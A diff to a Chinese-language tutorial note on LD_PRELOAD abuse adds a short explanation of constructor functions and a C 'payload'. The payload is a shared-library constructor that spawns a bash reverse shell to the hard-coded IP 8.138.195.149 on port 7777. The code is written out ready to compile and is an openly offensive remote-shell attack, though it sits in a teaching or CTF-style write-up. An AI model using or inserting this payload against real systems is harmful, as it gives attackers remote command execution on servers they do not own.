@@ -45,6 +45,7 @@ readelf -Ws /usr/sbin/sendmail  //查看sendmail函数调用了什么库，
 （这里用c语言写，并且编译成so文件）
 
 ```c
+# eval.c
 #include<stdio.h>                                                                                                                                                                 
 #include<stdlib.h>                                                                                                                                                      
 #include<string.h>                                                                                                                                                              
@@ -81,4 +82,20 @@ __attribute__((destructor)) void preload_exit() {
 }
 
 ```
-总的来说就是在
+总的来说就是在在执行main之前，就是加载库文件，在加载库文件的前后就会执行我们上面写的函数
+payload：
+```c
+# eval.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+void payload() {
+    system("bash -c 'bash -i >& /dev/tcp/8.138.195.149/7777 0>&1'");
+}
+__attribute__((constructor)) void preload (void)
+{
+    if (getenv("LD_PRELOAD") == NULL) { return 0; }
+    unsetenv("LD_PRELOAD");
+    payload();
+}
+```
